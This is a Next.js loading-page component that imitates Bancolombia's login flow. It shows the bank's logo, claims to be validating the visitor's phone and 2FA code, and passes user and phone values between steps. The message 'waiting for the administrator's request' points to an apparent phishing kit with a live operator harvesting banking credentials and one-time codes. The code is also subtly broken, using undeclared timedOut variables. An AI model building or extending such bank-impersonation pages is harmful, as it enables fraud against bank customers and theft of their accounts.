"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import AppLogoBancolombia from "./components/AppLogoBancolombia";
import AppFooter from "./components/AppFooter";

export default function LoadingPage({ searchParams }) {
  const router = useRouter();
  const next = searchParams?.next || "waiting";
  const phone = searchParams?.phone || "";
  const user = searchParams?.user || "";
  const [statusMessage, setStatusMessage] = useState("Cargando...");
  const [remainingSeconds, setRemainingSeconds] = useState(3);

  useEffect(() => {
    let timer = setInterval(() => {
      setRemainingSeconds((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          const query = user ? `?user=${encodeURIComponent(user)}${phone ? `&phone=${encodeURIComponent(phone)}` : ""}` : "";
          if (next === "code") {
            router.push(`/code?step=2${user ? `&user=${encodeURIComponent(user)}` : ""}${phone ? `&phone=${encodeURIComponent(phone)}` : ""}`);
          } else {
            router.push(`/code${query}`);
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [user, phone, next, router]);

  const onContinue = () => {
    if (timedOut) {
      setStatusMessage("Reiniciando monitor de espera...");
      setRemainingSeconds(60);
      setTimedOut(false);
      return;
    }

    if (next === "waiting") {
      setStatusMessage("Esperando solicitud del administrador... revisa si ya pulsó un botón.");
      return;
    }

    const userString = user ? `&user=${encodeURIComponent(user)}` : "";
    if (next === "code" || next === "flow") {
      router.push(`/code?step=2&phone=${encodeURIComponent(phone)}${userString}`);
      return;
    }

    router.push(`/code${userString}`);
  };

  const onCancel = () => {
    router.push("/code?step=1");
  };

  return (
    <>
      <main className="svp-main">
        <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
          <AppLogoBancolombia />
          <section className="bc-card bc-card-auth bc-card-container" style={{ minWidth: "320px", margin: "3rem auto" }}>
            <section className="bc-card-auth-body">
              <section className="bc-card-auth-head" style={{ textAlign: "center" }}>
                <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">Cargando...</h1>
                <p className="bc-card-auth-description bc-mt-3">
                  {next === "code" ? "Validando la información del teléfono..." : "Verificando el código 2FA..."}
                </p>
                <p style={{ color: "#fff", marginTop: "0.4rem" }}>
                  {statusMessage}
                </p>
                <p style={{ color: "#a1f0f7", marginTop: "0.2rem" }}>
                  Tiempo restante: {remainingSeconds} seg
                </p>
              </section>
              <section className="bc-card-auth-button" style={{ display: "grid", gap: "0.75rem", marginTop: "1.5rem" }}>
                <button type="button" className="bc-button bc-button-fill bc-button-primary" onClick={onContinue}>
                  Continuar
                </button>
                <button type="button" className="bc-button bc-button-outline" onClick={onCancel}>
                  Cancelar
                </button>
              </section>
            </section>
          </section>
        </div>
      </main>
      <AppFooter />
    </>
  );
}
